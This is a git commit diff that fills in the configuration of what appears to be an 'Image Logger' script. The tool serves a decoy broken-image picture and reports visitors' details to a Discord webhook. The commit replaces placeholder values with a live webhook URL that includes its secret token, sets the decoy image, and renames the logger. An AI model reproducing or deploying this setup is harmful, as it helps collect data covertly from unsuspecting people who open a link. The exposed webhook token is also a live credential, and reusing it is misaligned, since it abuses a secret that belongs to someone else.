65630e41cf4cadfca75b19d91a0f2c790f53b1e8
RngThic <166086386+RngThic@users.noreply.github.com>
2024-04-05 12:15:57 +1000

    Update IDK.py

--- api/IDK.py
+++ api/IDK.py
@@ -12,13 +12,13 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1225622654745317416/tKNGiDzkzBWOoave7okEpUuExIHdaAeprX6KUqTR86GI3RaPm1ZeBXT1UR-7BUbF7I01",
+    "image": "https://ehelperteam.com/wp-content/uploads/2019/09/Broken-images.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
